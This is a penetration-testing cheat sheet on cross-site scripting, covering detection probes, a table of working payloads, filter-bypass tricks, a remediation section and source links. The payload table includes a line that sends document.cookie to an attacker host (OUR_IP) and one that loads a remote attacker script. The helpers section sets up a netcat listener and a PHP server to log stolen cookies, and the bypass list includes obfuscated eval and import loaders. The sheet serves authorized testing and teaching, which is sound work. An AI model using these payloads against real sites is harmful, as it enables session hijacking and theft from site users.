# Cross-Site Scripting (XSS)

> Inject attacker-controlled JavaScript into a page rendered for other users. Authorized testing only.

## TL;DR
- Three kinds: reflected (in URL/POST), stored (persisted to DB/file), DOM-based (client-side sink).
- Probe order: confirm reflection → break out of context (HTML, attr, script, URL, CSS, JSON) → fire payload.
- CSP changes the impact, not the existence — a `script-src 'self'` page is still XSSable if attacker can host JS on `self`.
- CWE-79; map: OWASP WSTG-INPV-01 (Reflected), WSTG-INPV-02 (Stored), WSTG-CLNT-01 (DOM).

## Detection / Discovery
| Probe | Description |
| --- | --- |
| `'"<>` | Smoke test — find which characters survive unescaped |
| `</script><img src=x onerror=alert(1)>` | Break out of `<script>` context |
| `javascript:alert(1)` | URL-context (anchors, `window.location`) |
| `${alert(1)}` | Template-literal context |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run XSStrike on a URL parameter |

## Exploitation

### Payloads
| Payload | Description |
| --- | --- |
| `<script>alert(window.origin)</script>` | Basic XSS Payload |
| `<plaintext>` | Basic XSS Payload (legacy parser quirk) |
| `<script>print()</script>` | Basic XSS Payload |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |
| `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element |
| `<script src="http://OUR_IP/script.js"></script>` | Load remote script |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send cookie details to attacker |

### Helpers
| Command | Description |
| --- | --- |
| `sudo nc -lvnp 80` | Start `netcat` listener |
| `sudo php -S 0.0.0.0:80` | Start a quick PHP server to host scripts/log cookies |

### Bundled tooling
- [tools/web/XSStrike/](../tools/web/XSStrike/) — XSS detection and exploitation framework.

## Bypasses
- Tag/attr filter: `<svg onload=alert(1)>`, `<iframe srcdoc="<script>alert(1)</script>">`, `<details ontoggle=alert(1) open>`.
- Keyword filter on `script`/`alert`: `<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`, template literals, `(()=>{}).constructor('alert(1)')()`.
- Length-limited fields: external loader `<svg/onload=import('//x')>`.
- HTML-encoded contexts: try entities (`&#x3C;script&#x3E;`); event-handler sinks like `value="onfocus=alert(1) autofocus"`.

## Defence / Remediation
- **Output encoding at the sink** (HTML, attribute, JS, URL, CSS each have different rules) — never input filtering as a substitute.
- Modern templating engines (React, Angular, Vue, Django, Rails ERB) default to context-aware escaping; do not bypass with `dangerouslySetInnerHTML`, `v-html`, `|safe`, `html_safe` unless you've encoded yourself.
- **Content Security Policy** (`script-src 'self' 'nonce-...'; object-src 'none'; base-uri 'none'`) — defence in depth.
- `HttpOnly` cookies + `SameSite=Lax|Strict` to neuter cookie-theft impact (CWE-1004).
- DOM: never call `innerHTML`, `outerHTML`, `document.write` with attacker-controlled strings; use `textContent` / `setAttribute` / `Trusted Types`.

## Sources
- OWASP WSTG-INPV-01 Reflected XSS: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting
- OWASP WSTG-INPV-02 Stored XSS: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting
- PortSwigger XSS: https://portswigger.net/web-security/cross-site-scripting
- PortSwigger XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- OWASP Cheat Sheet — XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- PayloadsAllTheThings XSS Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- HackTricks XSS: https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html
